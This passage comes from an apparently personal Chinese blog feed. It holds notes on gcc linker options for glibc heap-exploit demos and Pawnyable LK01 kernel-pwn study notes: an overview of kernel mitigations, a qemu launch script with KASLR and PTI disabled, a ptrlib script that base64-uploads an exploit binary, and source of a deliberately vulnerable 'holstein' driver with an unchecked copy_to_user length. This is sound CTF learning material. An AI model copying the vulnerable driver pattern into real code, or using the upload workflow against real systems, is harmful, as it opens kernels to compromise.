<h2 id="之后需要掌握调用哪个程序会调用哪个os程序"><a href="#之后需要掌握调用哪个程序会调用哪个os程序" class="headerlink" title="之后需要掌握调用哪个程序会调用哪个os程序"></a>之后需要掌握调用哪个程序会调用哪个os程序</h2>]]></content>
      <categories>
        <category>ctf</category>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc天问之路</title>
    <url>/2024/08/09/gcc%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="gcc链接器"><a href="#gcc链接器" class="headerlink" title="gcc链接器"></a>gcc链接器</h1><h2 id="探坑之路"><a href="#探坑之路" class="headerlink" title="探坑之路"></a>探坑之路</h2><p>因为要为malloc的漏洞利用写demo，需要不同版本的共享库，之前一直再逃避写demo这件事，一直用的可执行文件，利用patchelf来更改链接器路径，但是为了深入学习还是得自己写demo，需要掌握编译链接的全过程。</p>
<p>一定要记住GUN不止GCC，gcc的时候也不是仅仅用gcc，遵从stfm的原则，想深入了解一下汇编链接的全过程去查看了一下gcc的文档，好无知，哈哈哈，明明更改动态链接库的版本需要的是ld，为什么要看gcc的文档呢，还是因为-Wl选项救了我，一看解释居然是给链接器传递参数。哈哈哈。接着赶快去看linker的文档，主要用上了这两个选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--rpath=...</span><br><span class="line">--dynamic-linker=....</span><br></pre></td></tr></table></figure>

<p>–rpath选项按文档上说是链接时查找的共享对象，但是我对这个共享库也知道甚少，因此对于其也仅仅会用的状态。</p>
<p>–dynamic-linker选项按文档的解释是更改linker的可执行文件，彻底激发了我的好奇心，原来linker可以被直接使用的，一直以为是个库，哈哈哈哈，无知的我。然后就去查了ld的文件类型。结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ file ld</span><br><span class="line">ld: symbolic link to x86_64-linux-gnu-ld</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld</span><br><span class="line">x86_64-linux-gnu-ld: symbolic link to x86_64-linux-gnu-ld.bfd</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld.bfd</span><br><span class="line">x86_64-linux-gnu-ld.bfd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c93d251e4e665bc9768ef05ba3086b166e95ec2b, for GNU/Linux 3.2.0, stripped</span><br><span class="line">l@L:/usr/bin$ file /lib64/ld-linux-x86-64.so.2</span><br><span class="line">/lib64/ld-linux-x86-64.so.2: symbolic link to /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">l@L:/usr/bin$ file /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=4186944c50f8a32b47d74931e3f512b811813b64, stripped</span><br></pre></td></tr></table></figure>

<p>盲菜ld这个东西是一个封装后的可以被人使用的程序，但是本质来看还是ld-linux-x86-64.so.2，调用其会出现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --help</span><br><span class="line">Usage: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]</span><br><span class="line">You have invoked &#x27;ld.so&#x27;, the program interpreter for dynamically-linked</span><br><span class="line">ELF programs.  Usually, the program interpreter is invoked automatically</span><br><span class="line">when a dynamically-linked executable is started.</span><br><span class="line"></span><br><span class="line">You may invoke the program interpreter program directly from the command</span><br><span class="line">line to load and run an ELF executable file; this is like executing that</span><br><span class="line">file itself, but always uses the program interpreter you invoked,</span><br><span class="line">instead of the program interpreter specified in the executable file you</span><br><span class="line">run.  Invoking the program interpreter directly provides access to</span><br><span class="line">additional diagnostics, and changing the dynamic linker behavior without</span><br><span class="line">setting environment variables (which would be inherited by subprocesses).</span><br></pre></td></tr></table></figure>

<p>坑越来越深，哈哈哈。</p>
<p>不过还是先记录下更改链接器的选项，不然又得查了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc top_chunk_demo1.c -Wl,--rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 -Wl,--dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br></pre></td></tr></table></figure>

<h2 id="无端猜测"><a href="#无端猜测" class="headerlink" title="无端猜测"></a>无端猜测</h2><p>本来挖出来的坑很多，要不就趁此机会把elf文件类型和编译过程真正搞通透，为未来的逆向打好基础，因为最近在学编译原理，一想，我还是把编译原理学完再说吧，效率高一点，编译原理目前是学到了yacc，以我浅薄的知识盲猜一下这个gcc的linker过程，汇编啥的不说了，所谓动态链接我猜测就是类似于python的解释过程，因为我在上述挖坑时看elf段意外发现了interpret这个段，楞一看这玩意跟解释器啥区别，之前一听解释器居然完全没联想起来，我一想动态连接，这玩意不就是在运行时需要啥拿啥吗，这python的解释器也是边解释边运行啊，编译模式的编译器，解释模式的编译器各有优点，这GUN怎么都有啊。。。。。难道时两者有点的结合？？我不知道，等学完编译原理再来补下面的吧，哈哈哈。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>杂项</category>
        <category>gcc|gun</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>elf</tag>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel_proctect &amp; exploit</title>
    <url>/2024/08/19/kernelpro/</url>
    <content><![CDATA[<p>摘抄自<a href="https://pawnyable.cafe/linux-kernel/introduction/security.html">https://pawnyable.cafe/linux-kernel/introduction/security.html</a></p>
<h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="SMEP（Supervisor-Mode-Execution-Prevention）"><a href="#SMEP（Supervisor-Mode-Execution-Prevention）" class="headerlink" title="SMEP（Supervisor Mode Execution Prevention）"></a>SMEP（Supervisor Mode Execution Prevention）</h2><blockquote>
<p>它禁止在执行内核空间代码时突然执行用户空间代码,硬件安全机制</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/*可查看系统的保护信息，其中的flag字段显示*/</span><br><span class="line">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>

<h2 id="SMAP（Supervisor-Mode-Access-Prevention）"><a href="#SMAP（Supervisor-Mode-Access-Prevention）" class="headerlink" title="SMAP（Supervisor Mode Access Prevention）"></a>SMAP（Supervisor Mode Access Prevention）</h2><blockquote>
<p>如果启用了 SMAP，则用户空间（ROP 链）中的数据 mmapped 在内核空间中不可见，因此堆栈枢轴的 <code>ret</code> 指令会触发内核崩溃,硬件安全机制</p>
</blockquote>
<h2 id="KASLR-FGKASLR"><a href="#KASLR-FGKASLR" class="headerlink" title="KASLR&#x2F;FGKASLR"></a>KASLR&#x2F;FGKASLR</h2><blockquote>
<p>它可以随机化 Linux 内核和设备驱动程序代码数据区域的地址。一旦内核加载，它就不会移动，因此 KASLR 在启动时只工作一次。</p>
<p><a href="https://lwn.net/Articles/824307/">自 2020 年初以来，</a>出现了一种<strong>名为 FGKASLR</strong>（功能粒度 KASLR）的更强大的 KASLR。 截至 2022 年，它似乎默认处于禁用状态，但这是一种为 Linux 内核中的每个函数随机化地址的技术。 即使 Linux 内核中函数的地址可以泄漏，也不会确定基址。但是，FGKASLR 不会随机化数据段等，因此如果数据的地址可以泄露，则可以获得基址。 但是，无法从基址确定特定函数的地址，但可以将其用于稍后出现的特殊攻击向量。</p>
<p>请注意，地址在内核空间中是通用的。 即使一个设备驱动程序由于 KASLR 而无法被利用，如果另一个驱动程序泄漏了内核地址，它也可能被利用，因为该地址是通用的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*可以使用内核启动参数禁用 KASLR*/</span></span><br><span class="line">-append <span class="string">&quot;... nokaslr ...&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="KPTI-Kernel-Page-Table-Isolation"><a href="#KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="KPTI(Kernel Page-Table Isolation)"></a>KPTI(Kernel Page-Table Isolation)</h2><blockquote>
<p>2018 年，在 Intel 等 CPU 上发现了一种名为 <a href="https://ja.wikipedia.org/wiki/Meltdown">Meltdown</a> 的侧信道攻击。 虽然没有解释这个漏洞，但它是一个严重的漏洞，允许用户以用户权限读取内核空间中的内存，并且有可能绕过 KASLR。 近年来，Linux 内核启用了一种称为 <strong>KPTI</strong>（内核页表隔离）或 <strong>KAISER</strong> 的旧名称机制，作为对 Meltdown 的对策。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-append <span class="string">&quot;... pti=on ...&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="KADR-Kernel-Address-Display-Restriction"><a href="#KADR-Kernel-Address-Display-Restriction" class="headerlink" title="KADR (Kernel Address Display Restriction)"></a>KADR (Kernel Address Display Restriction)</h2><blockquote>
<p>在 Linux 内核中，您可以从 <code>/proc/kallsyms</code> 读取函数的名称和地址信息。 此外，一些设备驱动程序使用 <code>printk</code> 函数将各种调试信息输出到日志中，用户可以通过 <code>dmesg</code> 命令查看这些信息。这样，Linux 就有一种机制可以防止内核空间中的函数、数据和堆等地址信息泄露。 我认为没有正式的名称，但它在<a href="https://inaz2.hatenablog.com/entry/2015/03/27/021422">参考资料</a>中似乎被称为 <strong>KADR</strong> （Kernel Address Display Restriction），所以我也将在这个网站上使用这个名称。</p>
<p>此功能可以通过 的值来 <code>/proc/sys/kernel/kptr_restrict</code> 更改。 如果 <code>kptr_restrict</code> 为 0，则对地址的显示没有限制。 如果 <code>kptr_restrict</code> 为 1，则向具有<code>CAP_SYSLOG</code>权限的用户显示地址。 如果 <code>kptr_restrict</code> 为 2，则隐藏内核地址，即使用户处于权限级别也是如此。</p>
</blockquote>
<h1 id="传输exploit"><a href="#传输exploit" class="headerlink" title="传输exploit"></a>传输exploit</h1><h2 id="本地制作与传输"><a href="#本地制作与传输" class="headerlink" title="本地制作与传输"></a>本地制作与传输</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gcc exploit.c -o exploit -static</span><br><span class="line"><span class="built_in">mv</span> exploit root</span><br><span class="line"><span class="built_in">cd</span> root; find . -print0 | cpio -o --null --format=newc &gt; ../debugfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -gdb tcp::12345 \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd debugfs.cpio \</span><br><span class="line">    -net nic,model=virtio \</span><br><span class="line">    -net user</span><br></pre></td></tr></table></figure>

<h2 id="关于musl-gcc"><a href="#关于musl-gcc" class="headerlink" title="关于musl-gcc"></a>关于musl-gcc</h2><blockquote>
<p>可以减少文件的尺寸</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# gcc exploit.c -o exploit -static</span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# <span class="built_in">ls</span> -al</span><br><span class="line">total 12292</span><br><span class="line">drwxr-xr-x  3 l    docker    4096 Aug 29 13:42 .</span><br><span class="line">drwxr-xr-x  5 l    docker    4096 Aug 29 13:41 ..</span><br><span class="line">-rw-------  1 root root       232 Aug 27 01:04 .gdb_history</span><br><span class="line">-rw-r--r--  1 l    docker 4720640 Oct 27  2021 bzImage</span><br><span class="line">-rw-r--r--  1 root root   2911744 Aug 29 13:19 debugfs.cpio</span><br><span class="line">-rwxr-xr-x  1 root root    900352 Aug 29 13:42 exploit</span><br><span class="line">-rw-r--r--  1 root root        71 Aug 29 13:18 exploit.c</span><br><span class="line">drwxr-xr-x 17 root root      4096 Aug 29 13:19 root</span><br><span class="line">-rw-r--r--  1 l    docker 2011136 Oct 27  2021 rootfs.cpio</span><br><span class="line">-rw-r--r--  1 root root   2011136 Aug 27 00:20 rootfs_updated.cpio</span><br><span class="line">-rwxr-xr-x  1 l    docker     352 Aug 29 00:28 run.sh</span><br><span class="line">-rw-r--r--  1 root root       451 Aug 29 13:19 transfer.sh</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# musl-gcc ./exploit.c -o exploit -static</span><br><span class="line">root@L:/home/l/kernelpwn/LK01/qemu# <span class="built_in">ls</span> -al</span><br><span class="line">total 11440</span><br><span class="line">drwxr-xr-x  3 l    docker    4096 Aug 29 13:43 .</span><br><span class="line">drwxr-xr-x  5 l    docker    4096 Aug 29 13:41 ..</span><br><span class="line">-rw-------  1 root root       232 Aug 27 01:04 .gdb_history</span><br><span class="line">-rw-r--r--  1 l    docker 4720640 Oct 27  2021 bzImage</span><br><span class="line">-rw-r--r--  1 root root   2911744 Aug 29 13:19 debugfs.cpio</span><br><span class="line">-rwxr-xr-x  1 root root     24728 Aug 29 13:43 exploit</span><br><span class="line">-rw-r--r--  1 root root        71 Aug 29 13:18 exploit.c</span><br><span class="line">drwxr-xr-x 17 root root      4096 Aug 29 13:19 root</span><br><span class="line">-rw-r--r--  1 l    docker 2011136 Oct 27  2021 rootfs.cpio</span><br><span class="line">-rw-r--r--  1 root root   2011136 Aug 27 00:20 rootfs_updated.cpio</span><br><span class="line">-rwxr-xr-x  1 l    docker     352 Aug 29 00:28 run.sh</span><br><span class="line">-rw-r--r--  1 root root       451 Aug 29 13:19 transfer.sh</span><br></pre></td></tr></table></figure>

<h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><blockquote>
<p>利用base64，和启动脚本进行远程转发,主要用来转发base64编码之后的二进制文件</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">cmd</span>):</span><br><span class="line">    sock.sendlineafter(<span class="string">&quot;$ &quot;</span>, cmd)</span><br><span class="line">    sock.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./root/exploit&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = bytes2str(base64.b64encode(f.read()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sock = Socket(&quot;HOST&quot;, PORT) # remote</span></span><br><span class="line">sock = Process(<span class="string">&quot;./run.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;cd /tmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.info(<span class="string">&quot;Uploading...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">512</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Uploading... <span class="subst">&#123;i:x&#125;</span> / <span class="subst">&#123;<span class="built_in">len</span>(payload):x&#125;</span>&quot;</span>)</span><br><span class="line">    run(<span class="string">&#x27;echo &quot;&#123;&#125;&quot; &gt;&gt; b64exp&#x27;</span>.<span class="built_in">format</span>(payload[i:i+<span class="number">512</span>]))</span><br><span class="line">run(<span class="string">&#x27;base64 -d b64exp &gt; exploit&#x27;</span>)</span><br><span class="line">run(<span class="string">&#x27;rm b64exp&#x27;</span>)</span><br><span class="line">run(<span class="string">&#x27;chmod +x exploit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sock.interactive()</span><br><span class="line">--------------------------结果----------------</span><br><span class="line">[ptrlib]$ /tmp <span class="comment"># [ptrlib]$ ls</span></span><br><span class="line">ls[ptrlib]$ </span><br><span class="line">[ptrlib]$ exploit      [ptrlib]$ [<span class="number">0</span>;0mmessages     [ptrlib]$ reso[ptrlib]$ lv[ptrlib]$ .c[ptrlib]$ onf[ptrlib]$ </span><br><span class="line">[ptrlib]$ /tmp <span class="comment"># [ptrli./exploit</span></span><br><span class="line">./exp[ptrlib]$ l[ptrlib]$ o[ptrlib]$ it[ptrlib]$ </span><br><span class="line">[ptrlib]$ Hello, World!</span><br><span class="line">不知道为什么格式那么乱</span><br></pre></td></tr></table></figure>



<h1 id="关于内核初始化"><a href="#关于内核初始化" class="headerlink" title="关于内核初始化"></a>关于内核初始化</h1><blockquote>
<p>以LK01为例子</p>
<p>主要是在&#x2F;etc文件中</p>
</blockquote>
<h2 id="inittab"><a href="#inittab" class="headerlink" title="inittab"></a>inittab</h2><blockquote>
<p>涉及到文件系统的挂载</p>
<p>主要是启动时和关闭时的行为</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/inittab</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright (C) 2001 Erik Andersen &lt;andersen@codepoet.org&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Note: BusyBox init doesn&#x27;t support runlevels.  The runlevels field is</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">completely ignored by BusyBox init. If you want runlevels, use</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysvinit.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Format for each entry: &lt;id&gt;:&lt;runlevels&gt;:&lt;action&gt;:&lt;process&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># id        == tty to run on, or empty for /dev/console</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">runlevels == ignored</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">action    == one of sysinit, respawn, askfirst, <span class="built_in">wait</span>, and once</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">process   == program to run</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Startup the system</span></span><br><span class="line">::sysinit:/bin/mount -t proc proc /proc</span><br><span class="line">::sysinit:/bin/mount -o remount,rw /</span><br><span class="line">::sysinit:/bin/mkdir -p /dev/pts /dev/shm</span><br><span class="line">::sysinit:/bin/mount -a</span><br><span class="line">::sysinit:/sbin/swapon -a</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd /dev/fd</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/0 /dev/stdin</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/1 /dev/stdout</span><br><span class="line">null::sysinit:/bin/ln -sf /proc/self/fd/2 /dev/stderr</span><br><span class="line">::sysinit:/bin/hostname -F /etc/hostname</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">now run any rc scripts</span></span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Put a getty on the serial port</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ttyS0::respawn:/sbin/getty -L ttyS0 115200 vt100 <span class="comment"># GENERIC_SERIAL</span></span></span><br><span class="line">tty1::respawn:/sbin/getty -L  tty1 0 vt100 # QEMU graphical window</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stuff to <span class="keyword">do</span> <span class="keyword">for</span> the 3-finger salute</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">::ctrlaltdel:/sbin/reboot</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stuff to <span class="keyword">do</span> before rebooting</span></span><br><span class="line">::shutdown:/etc/init.d/rcK</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h2><blockquote>
<p>目前已知包括了驱动的加载以及shell的加载</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Setup</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">mdev -s</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">stty -opost</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Install driver</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">insmod /root/vuln.ko</span><br><span class="line">mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk &#x27;&#123;print $1;&#125;&#x27;` 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># User shell</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot;</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Cleanup</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*本题考查此模块*/</span></span><br><span class="line">insmod /root/vuln.ko</span><br><span class="line">mknod -m <span class="number">666</span> /dev/holstein c `grep holstein /proc/devices | awk <span class="string">&#x27;&#123;print $1;&#125;&#x27;</span>` <span class="number">0</span></span><br></pre></td></tr></table></figure>



<h1 id="驱动模块源码分析"><a href="#驱动模块源码分析" class="headerlink" title="驱动模块源码分析"></a>驱动模块源码分析</h1><h2 id="设备注册和设备清除"><a href="#设备注册和设备清除" class="headerlink" title="设备注册和设备清除"></a>设备注册和设备清除</h2><blockquote>
<p>指定了模块加载以及退出时所要执行的函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">rcS中仅仅创建了一个节点真正关联是通过此来的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_init(module_initialize);</span><br><span class="line">module_exit(module_cleanup);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本次实验中的函数为:可通过DEVICE_NAME来传递</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;holstein&quot;</span></span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">   .owner   = THIS_MODULE,</span><br><span class="line">   .read    = module_read,</span><br><span class="line">   .write   = module_write,</span><br><span class="line">   .open    = module_open,</span><br><span class="line">   .release = module_close,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">dev_t</span> dev_id;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">module_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;dev_id, <span class="number">0</span>, <span class="number">1</span>, DEVICE_NAME)) &#123;</span><br><span class="line">    printk(KERN_WARNING <span class="string">&quot;Failed to register device\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cdev_init(&amp;c_dev, &amp;module_fops);</span><br><span class="line">  c_dev.owner = THIS_MODULE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, dev_id, <span class="number">1</span>)) &#123;</span><br><span class="line">    printk(KERN_WARNING <span class="string">&quot;Failed to add cdev\n&quot;</span>);</span><br><span class="line">    unregister_chrdev_region(dev_id, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">module_cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  cdev_del(&amp;c_dev);</span><br><span class="line">  unregister_chrdev_region(dev_id, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="open-read-write-close"><a href="#open-read-write-close" class="headerlink" title="open&amp;read&amp;write&amp;close"></a>open&amp;read&amp;write&amp;close</h2><blockquote>
<p>具体操作函数即是漏洞存在点，很容易发现溢出漏洞，但是利用还需学习</p>
<p>发现了栈溢出漏洞，但是open，close好像也有漏洞，因此需要深入学习</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_open called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_read</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                        <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                        <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kbuf[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(kbuf, g_buf, BUFFER_SIZE);</span><br><span class="line">  <span class="keyword">if</span> (_copy_to_user(buf, kbuf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span 